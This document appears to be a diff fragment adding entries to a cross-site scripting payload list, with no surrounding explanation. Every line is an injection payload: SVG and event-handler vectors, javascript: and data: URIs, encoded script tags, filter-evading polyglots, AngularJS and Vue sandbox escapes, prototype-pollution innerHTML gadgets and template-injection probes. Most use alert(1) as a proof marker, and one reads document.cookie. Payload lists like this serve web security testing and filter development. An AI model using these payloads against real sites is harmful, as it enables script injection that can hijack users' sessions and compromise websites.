+<svg><script>alert(1)</script></svg>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><set onbegin=alert(1) attributename=x to=1>
+<svg><style>{font-family:"\"}<img/src=x onerror=alert(1)//"}</style></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><a xlink:href='javascript:alert(1)'><rect width='100' height='100'/></a></svg>#x">
+<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></use></svg>
+<textarea autofocus onfocus="alert(1)">
+<textarea autofocus onfocus="alert(document.domain)">
+<textarea autofocus onfocus="confirm(1)">
+<textarea autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(document.domain)>
+<textarea autofocus onfocus=confirm(1)>
+<textarea onfocus=alert(1) autofocus>
+<title><img src=x onerror=alert(1)></title>
+<video onenterpictureinpicture=alert(1) src=x>
+<video onleavepictureinpicture=alert(1) src=x>
+<video src=x onerror="alert(1)">
+<video src=x onerror="alert(document.domain)">
+<video src=x onerror="confirm(1)">
+<video src=x onerror=alert(1)>
+<video src=x onerror=alert(document.domain)>
+<video src=x onerror=confirm(1)>
+<video/src=x/onerror=alert(1)>
+<video><source onerror=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus</x>
+<x style="animation-name:x" onanimationstart=alert(1)>
+<x style="transition:1s" ontransitionend=alert(1)>
+<x tabindex=0 onfocus=alert(1)>focus</x>
+<x/onclick=alert(1)>click
+<xmp><img src=x onerror=alert(1)></xmp>
+<xmp><p title="</xmp><img src=x onerror=alert(1)>">
+<xmp><p title="</xmp><svg/onload=alert(1)>">
+<xss style=pointer-events:none onmouseover=alert(1)>test</xss>
+<xss/id=x tabindex=1 onfocusin=alert(1)>
+>alert(1)</script>
+???script???alert(1)???/script???
+JAVASCRIPT:alert(1)
+[${alert(1)}]
+[1].map(alert)
+[].constructor.constructor('alert(1)')()
+\"-alert(1)//
+\";alert(1)//
+\"};alert(1)//"
+\'-alert(1)//
+\';alert(1)//
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+__proto__[innerHTML]=<img src=x onerror=alert(1)>
+`${alert(1)}`
+constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+expression(alert(1))
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0telerik:0telerik%0D%0A/telerik/</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert() )//%0d%0a%0d%0a//</stYle/</titLe/</telerik:*/telerik:9telerik:telerik></telerik:
+jaVascript:alert(1)
+java	script:alert(1)
+java
+script:alert(1)
+javascript:alert(1)
+javascript&#58;alert(1)
+javascript&#x3A;alert(1)
+javascript:/**/alert(1)
+javascript:/*-->*/alert(1)
+javascript:alert(1)
+javascript:alert(1)//
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+javascript:alert`1`
+javascript:void(alert(1))
+url(javascript:alert(1))
+vbscript:msgbox(1)
+{"__html": "<img src=x onerror=alert(1)>"}
+{"x":"<img src=x onerror=alert(1)>"}
+{{$eval.constructor("alert(1)")()}}
+{{$on.constructor("alert(1)")()}}
+{{$on.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
+{{7*7}}
+{{7*7}}${7*7}<%= 7*7 %>
+{{_c.constructor("alert(1)")()}}
+{{_openBlock.constructor("alert(1)")()}}
+{{alert(1)}}
+{{constructor.constructor("alert(1)")()}}
+{{constructor.constructor('alert(1)')()}}
+{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
